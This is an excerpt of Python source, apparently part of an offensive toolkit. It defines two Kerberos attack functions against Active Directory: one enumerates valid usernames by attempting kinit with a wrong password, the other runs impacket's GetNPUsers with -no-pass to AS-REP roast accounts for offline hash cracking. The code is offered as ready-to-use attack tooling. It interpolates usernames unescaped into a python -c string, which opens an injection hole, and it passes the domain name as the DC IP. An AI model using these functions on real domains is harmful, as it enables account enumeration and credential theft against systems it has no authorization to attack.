...
def kerberos_user_enum(domain, userlist_path):
    ...
    if not os.path.exists(userlist_path):
        return f"Userlist not found: {userlist_path}"
    valid = []
            ...
            try:
                r = subprocess.run(
                    [
                        "python3",
                        "-c",
                        f"import subprocess; subprocess.run(['kinit','{user}@{domain}'],input=b'wrong',capture_output=True)",
                    ],
                    capture_output=True,
                    text=True,
                    timeout=5,
                ...
                pass
    return (
        f"Valid users ({len(valid)}): {', '.join(valid[:20])}"
        if valid
        else "No valid users found or krb5 not configured"
    )
...
def kerberos_asrep_roast(domain, user):
    ...
    try:
        r = subprocess.run(
            ["python3", "-m", "impacket.examples.GetNPUsers", f"{domain}/{user}", "-no-pass", "-dc-ip", domain],
            capture_output=True,
            text=True,
            timeout=30,
        )
        ...
        return "Impacket not installed. Run: pip install impacket"
